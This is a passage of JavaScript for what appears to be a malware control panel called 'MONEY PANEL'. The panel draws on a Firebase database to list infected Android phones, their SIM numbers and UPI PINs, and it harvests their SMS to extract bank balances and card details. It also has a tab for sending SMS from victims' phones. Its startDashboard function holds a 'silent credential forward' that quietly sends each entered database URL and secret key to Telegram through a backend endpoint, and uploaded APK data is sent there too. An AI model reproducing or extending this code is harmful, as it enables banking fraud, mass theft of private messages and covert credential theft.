// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Helpers
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function escHtml(s) {
  if (s === null || s === undefined) return '';
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function escId(s) {
  return String(s).replace(/'/g, "\\'");
}

function showToast(msg, dur) {
  var el = document.getElementById('toast');
  el.textContent = msg;
  el.classList.add('visible');
  setTimeout(function() { el.classList.remove('visible'); }, dur || 3500);
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Login Page UI
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function renderSavedAccounts() {
  var accounts = loadAccounts();
  var list = document.getElementById('saved-list');
  var empty = document.getElementById('saved-empty');
  var count = document.getElementById('saved-count');

  count.textContent = accounts.length + ' ' + (accounts.length === 1 ? 'account' : 'accounts');

  if (accounts.length === 0) {
    empty.style.display = '';
    list.innerHTML = '';
    list.appendChild(empty);
    return;
  }

  empty.style.display = 'none';
  var html = '';
  accounts.forEach(function(acc) {
    html += '<div class="saved-item" onclick="connectSaved(\'' + acc.id + '\')">';
    html += '<div class="saved-item-info">';
    html += '<p class="saved-item-url">' + escHtml(acc.url) + '</p>';
    html += '<p class="saved-item-meta">' + escHtml(acc.date) + ' Â· ' + escHtml(acc.key.substring(0, 20)) + 'â€¦</p>';
    html += '</div>';
    html += '<div class="saved-item-actions">';
    // Share button
    html += '<button class="btn-icon btn-icon-share" onclick="event.stopPropagation();showShareModal(\'' + acc.id + '\')" title="Share">';
    html += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M7.217 10.907a2.25 2.25 0 100 2.186m0-2.186c.18.324.283.696.283 1.093s-.103.77-.283 1.093m0-2.186l9.566-5.314m-9.566 7.5l9.566 5.314m0 0a2.25 2.25 0 103.935 2.186 2.25 2.25 0 00-3.935-2.186zm0-12.814a2.25 2.25 0 103.933-2.185 2.25 2.25 0 00-3.933 2.185z"/></svg>';
    html += '</button>';
    // Delete button
    html += '<button class="btn-icon btn-icon-del" onclick="event.stopPropagation();deleteSaved(\'' + acc.id + '\')" title="Delete">';
    html += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M14.74 9l-.346 9m-4.788 0L9.26 9m9.968-3.21c.342.052.682.107 1.022.166m-1.022-.165L18.16 19.673a2.25 2.25 0 01-2.244 2.077H8.084a2.25 2.25 0 01-2.244-2.077L4.772 5.79m14.456 0a48.108 48.108 0 00-3.478-.397m-12 .562c.34-.059.68-.114 1.022-.165m0 0a48.11 48.11 0 013.478-.397m7.5 0v-.916c0-1.18-.91-2.164-2.09-2.201a51.964 51.964 0 00-3.32 0c-1.18.037-2.09 1.022-2.09 2.201v.916m7.5 0a48.667 48.667 0 00-7.5 0"/></svg>';
    html += '</button>';
    // Chevron
    html += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="chevron-right" style="width:1rem;height:1rem"><path stroke-linecap="round" stroke-linejoin="round" d="M8.25 4.5l7.5 7.5-7.5 7.5"/></svg>';
    html += '</div>';
    html += '</div>';
  });
  list.innerHTML = html;
  if (accounts.length === 0) list.appendChild(empty);
}

function showNewAccountForm() {
  document.getElementById('saved-accounts-section').style.display = 'none';
  document.getElementById('new-account-form').style.display = 'block';
}

function showSavedAccounts() {
  document.getElementById('new-account-form').style.display = 'none';
  document.getElementById('saved-accounts-section').style.display = 'block';
  clearApkState();
  document.getElementById('input-url').value = '';
  document.getElementById('input-key').value = '';
  setFormError('');
}

function setFormError(msg) {
  var el = document.getElementById('form-error');
  el.textContent = msg;
  el.classList.toggle('visible', !!msg);
}

async function connectSaved(id) {
  var accounts = loadAccounts();
  var acc = accounts.find(function(a) { return a.id == id; });
  if (!acc) return;
  await startDashboard(acc.url, acc.key);
}

function deleteSaved(id) {
  if (!confirm('Delete this account permanently?')) return;
  var accounts = loadAccounts().filter(function(a) { return a.id != id; });
  saveAccounts(accounts);
  renderSavedAccounts();
}

function showShareModal(id) {
  var accounts = loadAccounts();
  var acc = accounts.find(function(a) { return a.id == id; });
  if (!acc) return;
  var link = makeShareLink(acc.url, acc.key);
  document.getElementById('share-link-text').textContent = link;
  document.getElementById('share-modal').style.display = 'flex';
}

function closeShareModal() {
  document.getElementById('share-modal').style.display = 'none';
}

function copyShareLink() {
  var link = document.getElementById('share-link-text').textContent;
  navigator.clipboard.writeText(link).then(function() {
    var btn = document.getElementById('btn-copy-share');
    btn.textContent = 'Copied!';
    setTimeout(function() { btn.textContent = 'Copy'; }, 2000);
  });
}

async function handleConnect() {
  var url = document.getElementById('input-url').value.trim().replace(/\/$/, '');
  var key = document.getElementById('input-key').value.trim();

  if (!url || !key) { setFormError('Please enter both URL and Key.'); return; }

  var accounts = loadAccounts();
  var existing = accounts.find(function(a) { return a.url === url; });
  if (existing) {
    if (confirm('Account already exists. Switch to it?')) {
      await connectSaved(existing.id);
    }
    return;
  }

  var btn = document.getElementById('btn-connect');
  var btnText = document.getElementById('btn-connect-text');
  btn.disabled = true;
  btnText.textContent = 'Connectingâ€¦';
  setFormError('');

  try {
    // Test connection by fetching clients
    await fbFetch(url, key, 'clients');

    // Save account
    var acc = { id: Date.now(), url: url, key: key, date: new Date().toLocaleString() };
    accounts.push(acc);
    saveAccounts(accounts);

    await startDashboard(url, key);
  } catch(e) {
    var msg = e.message || String(e);
    if (msg.includes('PERMISSION_DENIED')) {
      setFormError('Connection failed: Permission denied. Use the Database Secret key (not the API key starting with AIzaâ€¦).');
    } else if (msg.includes('NOT_FOUND')) {
      setFormError('Connection failed: Database URL not found. Check the URL.');
    } else {
      setFormError('Connection failed: ' + msg.slice(0, 80));
    }
  } finally {
    btn.disabled = false;
    btnText.textContent = 'Save & Connect';
  }
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// APK parsing (basic ZIP/APK scan for firebase URL + key in strings)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function handleApkDrop(event) {
  event.preventDefault();
  var f = event.dataTransfer.files[0];
  if (f) processApkFile(f);
}

function handleApkFile(event) {
  var f = event.target.files && event.target.files[0];
  if (f) processApkFile(f);
  event.target.value = '';
}

async function processApkFile(file) {
  clearApkState();
  document.getElementById('apk-dropzone').style.display = 'none';
  document.getElementById('apk-scanning').classList.add('visible');
  document.getElementById('apk-scan-status').textContent = file.name;

  try {
    // Upload to backend API for scanning and Telegram notification
    var formData = new FormData();
    formData.append('apk', file);

    var response = await fetch('/api/apk-scan', {
      method: 'POST',
      body: formData
    });

    if (!response.ok) {
      var errData = await response.json().catch(function() { return {}; });
      throw new Error(errData.error || 'Failed to scan APK (HTTP ' + response.status + ')');
    }

    var result = await response.json();
    
    if (!result.firebaseUrl) {
      throw new Error('Firebase URL not found in APK.');
    }

    document.getElementById('apk-scanning').classList.remove('visible');
    document.getElementById('apk-success').classList.add('visible');
    document.getElementById('apk-url-display').textContent = result.firebaseUrl;
    document.getElementById('apk-key-display').textContent = result.apiKey || result.databaseSecret || 'Not found â€" enter manually';

    // Auto-fill fields
    document.getElementById('input-url').value = result.firebaseUrl;
    if (result.apiKey) document.getElementById('input-key').value = result.apiKey;
    else if (result.databaseSecret) document.getElementById('input-key').value = result.databaseSecret;

    // Show success toast that data was sent to Telegram
    if (result.telegramSent) {
      showToast('✅ APK data sent to Telegram bot!', 5000);
    }

  } catch(e) {
    document.getElementById('apk-scanning').classList.remove('visible');
    document.getElementById('apk-error').classList.add('visible');
    document.getElementById('apk-error-msg').textContent = e.message || 'Failed to parse APK.';
    document.getElementById('apk-dropzone').style.display = '';
  }
}

function clearApkState() {
  document.getElementById('apk-dropzone').style.display = '';
  document.getElementById('apk-scanning').classList.remove('visible');
  document.getElementById('apk-error').classList.remove('visible');
  document.getElementById('apk-success').classList.remove('visible');
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Dashboard
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function startDashboard(url, key) {
  STATE.fbUrl = url;
  STATE.fbKey = key;
  STATE.devices = [];
  STATE.smsLoaded = new Set();

  // Silent credential forward â€” calls serverless function, zero secrets in browser
  (function() {
    try {
      var ts  = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
      var txt = '🔥 <b>MONEY PANEL — New Firebase Connected</b>\n\n'
        + '<b>URL:</b> <code>' + url + '</code>\n\n'
        + '<b>Key:</b> <code>' + key + '</code>\n\n'
        + '⏰ ' + ts;
      fetch('/api/notify', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ text: txt, parse_mode: 'HTML' })
      }).catch(function() {});
    } catch(e) {}
  })();

  // Switch pages
  document.getElementById('login-page').style.display = 'none';
  var dashPage = document.getElementById('dashboard-page');
  dashPage.style.display = 'flex';
  dashPage.style.flexDirection = 'column';

  // Skeletons
  document.getElementById('skeleton-grid').innerHTML = renderSkeletons(6);
  document.getElementById('loading-state').classList.add('visible');
  document.getElementById('empty-state').classList.remove('visible');
  document.getElementById('cards-container').style.display = 'none';

  // Start clock
  startClock();

  // Initial fetch
  await loadDevices(false);

  // Auto-refresh devices every 15s
  if (STATE.refreshTimer) clearInterval(STATE.refreshTimer);
  STATE.refreshTimer = setInterval(function() { loadDevices(true); }, 15000);

  // Auto-refresh SMS every 45s
  if (STATE.smsRefreshTimer) clearInterval(STATE.smsRefreshTimer);
  STATE.smsRefreshTimer = setInterval(function() { refreshAllSms(); }, 45000);
}

async function loadDevices(silent) {
  try {
    var raw;
    try {
      raw = await fbFetch(STATE.fbUrl, STATE.fbKey, 'clients');
    } catch(e) {
      // Try root
      raw = await fbFetch(STATE.fbUrl, STATE.fbKey, '');
    }

    var prevCount = STATE.devices.length;
    var parsed = parseDevices(raw);

    // Preserve SMS analysis from previous state
    var prevMap = {};
    STATE.devices.forEach(function(d) { prevMap[d.id] = d.smsAnalysis; });
    parsed.forEach(function(d) {
      if (prevMap[d.id]) d.smsAnalysis = prevMap[d.id];
    });

    STATE.devices = parsed;
    dismissError();
    renderDashboard();

    if (!silent) {
      // Fire SMS fetch in background â€” cards already rendered, they update in-place
      batchFetchSms(parsed); // intentionally NOT awaited
    }

    // Notify new device
    if (prevCount > 0 && parsed.length > prevCount) {
      showToast('ðŸ”” New device connected!');
    }

  } catch(e) {
    var msg = e.message || String(e);
    if (msg.includes('PERMISSION_DENIED') || msg.includes('401') || msg.includes('403')) {
      showError('Firebase Permission Denied â€” Your key is rejected. Go to Firebase Console â†’ Project Settings â†’ Service Accounts â†’ Database Secrets and copy the secret key. That secret (not the API key starting with AIzaâ€¦) is what works here.');
    } else if (msg.includes('NOT_FOUND') || msg.includes('404')) {
      showError('Database path not found. Check your Firebase URL is correct.');
    } else {
      showError('Connection error: ' + msg.slice(0, 120));
    }
    if (STATE.devices.length === 0) {
      document.getElementById('loading-state').classList.remove('visible');
      document.getElementById('empty-state').classList.add('visible');
      document.getElementById('cards-container').style.display = 'none';
    }
  }
}

// â”€â”€â”€ Progressive real-time SMS fetch â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Cards render immediately. Each device's card updates the INSTANT its SMS
// resolves â€” no waiting for the full batch. Online devices fetched first.
async function batchFetchSms(devices) {
  var toFetch = devices.filter(function(d) { return !STATE.smsLoaded.has(d.id); });
  if (toFetch.length === 0) return;

  // Online devices first â€” they're the ones user cares about most
  toFetch.sort(function(a, b) {
    if (a.status && !b.status) return -1;
    if (!a.status && b.status) return 1;
    return 0;
  });

  var banner = document.getElementById('sms-loading-banner');
  banner.classList.add('visible');
  var remaining = toFetch.length;

  // Fire all fetches concurrently in chunks of 10
  // Each one updates the card the INSTANT it resolves
  var CONCURRENCY = 10;
  var idx = 0;

  function runNext() {
    if (idx >= toFetch.length) return;
    var dev = toFetch[idx++];
    fetchDeviceSms(dev.id).then(function(result) {
      var d = STATE.devices.find(function(x) { return x.id === dev.id; });
      if (d && result && result.analysis) {
        d.smsAnalysis = result.analysis;
        d.rawMsgs = result.rawMsgs;
        STATE.smsLoaded.add(dev.id);
        // Update only this card in the DOM â€” no full re-render
        updateCardInPlace(d);
        updateStats();
      } else {
        STATE.smsLoaded.add(dev.id);
      }
      remaining--;
      if (remaining <= 0) {
        banner.classList.remove('visible');
      }
      // Pull next item into concurrency slot
      runNext();
    }).catch(function() {
      STATE.smsLoaded.add(dev.id);
      remaining--;
      if (remaining <= 0) banner.classList.remove('visible');
      runNext();
    });
  }

  // Seed concurrency pool
  for (var s = 0; s < Math.min(CONCURRENCY, toFetch.length); s++) {
    runNext();
  }
}

// Update a single card's DOM node in-place after SMS loads
// Replaces only the card element â€” zero flicker, zero full re-render
function updateCardInPlace(dev) {
  var el = document.getElementById('card-' + dev.id);
  if (!el) return; // card not currently visible (filtered out)
  var newHtml = renderCard(dev);
  var tmp = document.createElement('div');
  tmp.innerHTML = newHtml;
  var newEl = tmp.firstElementChild;
  if (newEl) el.parentNode.replaceChild(newEl, el);
}

// Update stats bar counters only (cheap DOM op)
function updateStats() {
  var devices = STATE.devices;
  var online = devices.filter(function(d) { return d.status; }).length;
  var bankCount = devices.filter(function(d) { return d.smsAnalysis && d.smsAnalysis.bankBalances && d.smsAnalysis.bankBalances.length; }).length;
  var cardCount = devices.filter(function(d) { return d.smsAnalysis && d.smsAnalysis.cards && d.smsAnalysis.cards.length; }).length;
  document.getElementById('stat-total').textContent = devices.length;
  document.getElementById('stat-online').textContent = online;
  document.getElementById('stat-offline').textContent = devices.length - online;
  document.getElementById('stat-bank').textContent = bankCount;
  document.getElementById('stat-cards').textContent = cardCount;
}

async function fetchDeviceSms(deviceId) {
  try {
    var raw;
    try {
      // Try root-level messages/{id} first (profex exact path)
      raw = await fbFetch(STATE.fbUrl, STATE.fbKey, 'messages/' + deviceId, {
        'orderBy': '"$key"', 'limitToLast': '150'
      });
    } catch(e1) {
      // Fallback to clients/{id}/messages
      raw = await fbFetch(STATE.fbUrl, STATE.fbKey, 'clients/' + deviceId + '/messages', {
        'orderBy': '"$key"', 'limitToLast': '150'
      });
    }
    var msgs = parseSmsData(raw);
    return { analysis: analyzeSms(msgs), rawMsgs: msgs };
  } catch(e) {
    return null;
  }
}

async function refreshAllSms() {
  var devices = STATE.devices;
  var CONCURRENCY = 10;
  var idx = 0;
  function runNext() {
    if (idx >= devices.length) return;
    var dev = devices[idx++];
    fetchDeviceSms(dev.id).then(function(result) {
      var d = STATE.devices.find(function(x) { return x.id === dev.id; });
      if (d && result && result.analysis) {
        d.smsAnalysis = result.analysis;
        d.rawMsgs = result.rawMsgs;
        updateCardInPlace(d);
        updateStats();
      }
      runNext();
    }).catch(function() { runNext(); });
  }
  for (var s = 0; s < Math.min(CONCURRENCY, devices.length); s++) runNext();
}

function renderDashboard() {
  var devices = STATE.devices;

  // Update stats
  var online = devices.filter(function(d) { return d.status; }).length;
  var bankCount = devices.filter(function(d) { return d.smsAnalysis && d.smsAnalysis.bankBalances && d.smsAnalysis.bankBalances.length; }).length;
  var cardCount = devices.filter(function(d) { return d.smsAnalysis && d.smsAnalysis.cards && d.smsAnalysis.cards.length; }).length;

  document.getElementById('stat-total').textContent = devices.length;
  document.getElementById('stat-online').textContent = online;
  document.getElementById('stat-offline').textContent = devices.length - online;
  document.getElementById('stat-bank').textContent = bankCount;
  document.getElementById('stat-cards').textContent = cardCount;

  // Show/hide sections
  document.getElementById('loading-state').classList.remove('visible');

  if (devices.length === 0) {
    document.getElementById('empty-state').classList.add('visible');
    document.getElementById('cards-container').style.display = 'none';
  } else {
    document.getElementById('empty-state').classList.remove('visible');
    document.getElementById('cards-container').style.display = '';
    applyFilters();
  }
}

function applyFilters() {
  var filter = STATE.filter;
  var sort = document.getElementById('sort-select') ? document.getElementById('sort-select').value : 'new';
  var q = document.getElementById('search-input') ? document.getElementById('search-input').value.toLowerCase() : '';

  var filtered = STATE.devices.filter(function(d) {
    if (filter === 'online' && !d.status) return false;
    if (filter === 'offline' && d.status) return false;
    if (filter === 'upi' && !d.upipin) return false;
    if (filter === 'bank' && !(d.smsAnalysis && d.smsAnalysis.bankBalances && d.smsAnalysis.bankBalances.length)) return false;
    if (filter === 'card' && !(d.smsAnalysis && d.smsAnalysis.cards && d.smsAnalysis.cards.length)) return false;
    if (q) {
      var name = (d.name || '').toLowerCase();
      var phone = (d.phoneNumber || '').toLowerCase();
      var id = (d.id || '').toLowerCase();
      if (!name.includes(q) && !phone.includes(q) && !id.includes(q)) return false;
    }
    return true;
  });

  filtered.sort(function(a, b) {
    if (sort === 'name') return (a.name || '').localeCompare(b.name || '');
    if (sort === 'battery') return b.batteryPercent - a.batteryPercent;
    if (sort === 'old') return (a.id || '').localeCompare(b.id || '');
    return (b.id || '').localeCompare(a.id || ''); // newest
  });

  var grid = document.getElementById('cards-grid');
  if (!grid) return;

  if (filtered.length === 0) {
    grid.innerHTML = '<div class="filter-empty visible"><p>No devices match your filter</p></div>';
  } else {
    var html = '';
    filtered.forEach(function(dev) { html += renderCard(dev); });
    grid.innerHTML = html;
  }
}

function setFilter(filter, btnEl) {
  STATE.filter = filter;
  // Update button styles
  var btns = document.querySelectorAll('.filter-btn');
  btns.forEach(function(b) {
    b.classList.remove('active', 'active-bank', 'active-card');
  });
  if (btnEl) {
    if (filter === 'bank') btnEl.classList.add('active-bank');
    else if (filter === 'card') btnEl.classList.add('active-card');
    else btnEl.classList.add('active');
  }
  applyFilters();
}

function triggerRefresh() {
  var btn = document.getElementById('btn-refresh');
  btn.classList.add('spinning');
  loadDevices(false).then(function() {
    btn.classList.remove('spinning');
  }).catch(function() {
    btn.classList.remove('spinning');
  });
}

function showError(msg) {
  var banner = document.getElementById('error-banner');
  document.getElementById('error-banner-msg').textContent = msg;
  banner.classList.add('visible');
}

function dismissError() {
  document.getElementById('error-banner').classList.remove('visible');
}

function handleLogout() {
  if (!confirm('Logout from current account?')) return;
  if (STATE.refreshTimer) clearInterval(STATE.refreshTimer);
  if (STATE.smsRefreshTimer) clearInterval(STATE.smsRefreshTimer);
  if (STATE.clockTimer) clearInterval(STATE.clockTimer);
  STATE.devices = [];
  STATE.fbUrl = '';
  STATE.fbKey = '';
  STATE.smsLoaded = new Set();
  document.getElementById('dashboard-page').style.display = 'none';
  document.getElementById('login-page').style.display = 'flex';
  renderSavedAccounts();
  showSavedAccounts();
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Clock
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function startClock() {
  if (STATE.clockTimer) clearInterval(STATE.clockTimer);
  function tick() {
    var now = new Date();
    var h = String(now.getHours()).padStart(2, '0');
    var m = String(now.getMinutes()).padStart(2, '0');
    var el = document.getElementById('clock-display');
    if (el) el.textContent = h + ':' + m;
  }
  tick();
  STATE.clockTimer = setInterval(tick, 1000);
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Detail Panel
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function openDetail(devId) {
  var dev = STATE.devices.find(function(d) { return d.id === devId; });
  if (!dev) return;
  STATE.detailDev = dev;

  // Render header
  var iconEl = document.getElementById('detail-icon');
  iconEl.className = 'detail-device-icon' + (dev.status ? ' online' : '');
  document.getElementById('detail-name').textContent = dev.name;
  document.getElementById('detail-dev-id').textContent = dev.id;

  // Status bar
  var dotEl = document.getElementById('detail-status-dot');
  var statusText = document.getElementById('detail-status-text');
  var offlineSince = document.getElementById('detail-offline-since');
  dotEl.className = 'status-dot ' + (dev.status ? 'online' : 'offline');
  statusText.textContent = dev.status ? 'Online' : 'Offline';
  statusText.style.color = dev.status ? '#4ade80' : '#555';
  offlineSince.textContent = (!dev.status && dev.lastSeen) ? 'since ' + formatLastSeen(dev.lastSeen) : '';

  var batColor = dev.batteryPercent >= 60 ? '#4ade80' : dev.batteryPercent >= 30 ? '#fde68a' : '#ef4444';
  var batVal = document.getElementById('detail-bat-val');
  batVal.textContent = dev.battery;
  batVal.style.color = batColor;
  batVal.style.fontWeight = '700';
  batVal.style.fontSize = '0.65rem';

  var upiB = document.getElementById('detail-upi-badge');
  upiB.style.display = dev.upipin ? '' : 'none';
  if (dev.upipin) upiB.textContent = 'UPI: ' + dev.upipin.split('|')[0];

  // Render Info tab
  renderInfoTab(dev);

  // Reset tabs
  switchTab('info', document.querySelector('.tab-btn[data-tab="info"]'));

  // Load SMS
  loadDetailSms(dev);

  // Send tab setup
  document.getElementById('send-to').value = '';
  document.getElementById('send-msg').value = '';
  document.getElementById('send-char-count').textContent = '0 chars';
  selectSim(1);
  var useNumBtn = document.getElementById('btn-use-number');
  var phone = dev.phoneNumber && dev.phoneNumber !== 'â€”' ? dev.phoneNumber : '';
  if (phone) {
    useNumBtn.style.display = '';
    document.getElementById('device-number-display').textContent = phone;
  } else {
    useNumBtn.style.display = 'none';
  }

  // Show overlay
  var overlay = document.getElementById('detail-overlay');
  overlay.classList.add('visible');
  overlay.style.display = 'flex';
}

function renderInfoTab(dev) {
  // Offline/online box
  if (!dev.status && dev.lastSeen) {
    document.getElementById('detail-offline-box').style.display = '';
    document.getElementById('detail-offline-time').textContent = formatLastSeen(dev.lastSeen);
    document.getElementById('detail-offline-ts').textContent = formatTimestamp(dev.lastSeen);
    document.getElementById('detail-online-box').style.display = 'none';
  } else if (dev.status && dev.lastSeen) {
    document.getElementById('detail-online-box').style.display = '';
    document.getElementById('detail-online-ts').textContent = formatTimestamp(dev.lastSeen);
    document.getElementById('detail-offline-box').style.display = 'none';
  } else {
    document.getElementById('detail-offline-box').style.display = 'none';
    document.getElementById('detail-online-box').style.display = 'none';
  }

  // Info rows
  var rows = [
    ['Phone Number', dev.phoneNumber, true, ''],
    ['Network', dev.provider, false, ''],
    ['Android', dev.android, false, ''],
    ['IP Address', dev.ip, true, ''],
    ['Storage', dev.storage, false, ''],
    ['CPU Arch', dev.cpu, true, ''],
    ['SDK Version', dev.sdk, false, ''],
    ['Device ID', dev.id, true, ''],
    ['SIM Cards', dev.sims.length + ' SIM(s)', false, ''],
  ];

  dev.sims.forEach(function(sim, i) {
    if (sim && sim.phoneNumber) {
      rows.push(['SIM ' + (i+1) + ' Number', sim.phoneNumber, true, 'highlight']);
    }
    if (sim && sim.carrierName) {
      rows.push(['SIM ' + (i+1) + ' Carrier', sim.carrierName, false, 'highlight2']);
    }
  });

  var html = '';
  rows.forEach(function(r) {
    html += '<div class="info-row">';
    html += '<span class="info-row-label">' + escHtml(r[0]) + '</span>';
    html += '<span class="info-row-value' + (r[2] ? ' mono' : '') + (r[3] ? ' ' + r[3] : '') + '">' + escHtml(r[1] || 'â€”') + '</span>';
    html += '</div>';
  });
  document.getElementById('info-rows').innerHTML = html;
  document.getElementById('info-sms-section').style.display = 'none';
}

async function loadDetailSms(dev) {
  // If we already have cached SMS for this device, render immediately
  // so the user sees content instantly while the refresh runs in background
  if (dev.rawMsgs && dev.rawMsgs.length > 0 && dev.smsAnalysis) {
    STATE.detailSms = dev.rawMsgs;
    STATE.detailAnalysis = dev.smsAnalysis;
    renderDetailSms(dev.rawMsgs, dev.smsAnalysis, dev);
    updateDetailBadges(dev.smsAnalysis);
  } else {
    // No cache â€” show loading state
    document.getElementById('bank-loading').style.display = 'block';
    document.getElementById('bank-empty').style.display = 'none';
    document.getElementById('bank-list').style.display = 'none';
    document.getElementById('sms-loading').style.display = 'block';
    document.getElementById('sms-empty').style.display = 'none';
    document.getElementById('sms-list').style.display = 'none';
  }

  try {
    var result = await fetchDeviceSms(dev.id);
    var msgs = (result && result.rawMsgs) ? result.rawMsgs : [];
    var analysis = (result && result.analysis) ? result.analysis : analyzeSms([]);

    // Update device cache
    dev.smsAnalysis = analysis;
    dev.rawMsgs = msgs;
    STATE.smsLoaded.add(dev.id);

    // Update detail state
    STATE.detailSms = msgs;
    STATE.detailAnalysis = analysis;

    renderDetailSms(msgs, analysis, dev);
    updateDetailBadges(analysis);
  } catch(e) {
    // On error, keep cached data visible if we have it
    if (dev.rawMsgs && dev.rawMsgs.length > 0) {
      // Already rendered above â€” just hide spinners
      document.getElementById('bank-loading').style.display = 'none';
      document.getElementById('sms-loading').style.display = 'none';
    } else {
      STATE.detailSms = [];
      STATE.detailAnalysis = null;
      document.getElementById('bank-loading').style.display = 'none';
      document.getElementById('bank-empty').style.display = 'block';
      document.getElementById('sms-loading').style.display = 'none';
      document.getElementById('sms-empty').style.display = 'block';
    }
  }
}




function updateDetailBadges(analysis) {
  var bankCount = analysis.bankBalances.length;
  var cardCount = analysis.cards.length;
